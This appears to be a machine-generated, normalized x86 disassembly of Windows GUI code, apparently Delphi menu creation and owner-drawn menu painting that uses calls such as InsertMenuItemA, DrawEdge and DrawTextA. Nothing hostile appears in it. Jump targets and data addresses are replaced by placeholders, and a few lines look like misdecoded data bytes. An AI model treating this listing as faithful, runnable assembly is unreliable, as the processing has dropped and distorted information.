mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_404338
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_446e4c
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_4453e0
mov [ ebp - 0x25 ] eax
sub_44514b
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_444ed0
xor eax eax
pop ebp
retn
sub_445170
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_448a44
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_447a0c
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_447f08
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_44490c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_4451e0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44522a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4183a0
mov eax [ ebp - 0x4 ]
call sub_444794
mov edx eax
mov eax ebx
call sub_446e80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445231
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_445238
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_4452b0
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_419340
sub_445274
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4196c0
mov eax ebx
call sub_446e34
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_446e34
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403324
pop esi
pop ebx
retn
mov eax ebx
call sub_4452b0
sub_4452b0
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_4453e0
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_4452b0
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_4453e0
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_4453e0
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_445170
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebp
call sub_4453e0
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_445380
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_446e4c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_446e5c
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_446e5c
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_446e5c
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_444488
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_4453e0
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_445170
mov eax [ rw-data ]
call sub_444488
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_44542c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4195e8
push ebx
push sub_4451e0
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_445470
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_445654
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_447408
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403f10
test bh 0x4
je r-xdata
mov eax edi
call sub_448a44
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404284
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41ce64
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404140
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_41c81c
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_41c828
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44565b
lea eax [ ebp - 0xc ]
call sub_403e78
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d4a0
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404138
push eax
mov eax [ ebp - 0xc ]
call sub_404338
push eax
mov eax [ ebp - 0x4 ]
call sub_41d4a0
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c55c
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404138
push eax
mov eax [ ebp - 0xc ]
call sub_404338
push eax
mov eax [ ebp - 0x4 ]
call sub_41d4a0
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41c55c
mov eax 0xff00000d
call sub_41c09c
mov esi eax
mov eax 0xff000010
call sub_41c09c
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c55c
jmp r-xdata
sub_4456c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_445fa8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d120
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41cd48
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c55c
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404284
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41cd48
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d120
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44225c
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d4a0
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cd40
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41cd48
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_445b07
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_422154
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41c55c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44225c
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41cd48
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d120
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cd40
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4231a8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cd1c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d120
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d120
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d230
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_442774
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cd48
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_445470
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41c828
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d4a0
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41d040
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41c55c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403128
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d4a0
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_445470
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
